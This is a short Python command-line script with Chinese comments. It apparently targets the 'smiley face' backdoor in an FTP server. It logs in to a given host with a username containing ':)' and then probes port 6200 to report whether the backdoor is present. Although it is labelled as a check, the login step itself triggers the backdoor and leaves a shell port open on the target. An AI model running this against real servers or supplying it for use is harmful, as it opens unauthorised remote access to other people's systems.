import socket
from ftplib import FTP
import argparse
 
def smileftp(url):
    #url = input("请输入你需要检测的地址：")
    ftp = FTP()
    username = 'root:)' #用户名必须包含：)这两个字符
    password = 'anonymous' #密码随便啥都行
    try:
        ftp.connect(url,21,timeout=10)#使用ftp登录，设置延时10秒
        ftp.login(username,password)
        ftp.quit()
    except:
        print("完成登录检测")
    try:
        s = socket.socket() #使用socket函数来检测是否有漏洞存在
        s.connect((url,6200))
        s.close()
        print("存在微笑漏洞")
    except:
        print("没有发现笑脸漏洞！")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str)
    args = parser.parse_args()
    print(smileftp(args.url))